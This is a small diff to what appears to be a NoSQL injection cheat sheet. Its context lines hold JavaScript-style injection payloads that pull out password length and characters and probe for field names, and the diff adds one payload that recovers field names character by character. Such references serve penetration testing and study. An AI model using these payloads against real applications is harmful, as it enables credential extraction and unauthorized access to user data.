@@ -54,6 +54,7 @@ If this doesn't work, you can try the following:
 ' && this.password.length < 50%00 >> For extracting password length in URL
 ' && this.password[0] == 'a'%00 >> For extracting password in URL
 ' && this.username!=' >> Identifying field names
+' && this['u'] && 'a'=='b >> Retrieving field name character by character
 ```
 ### Identifying field names
 
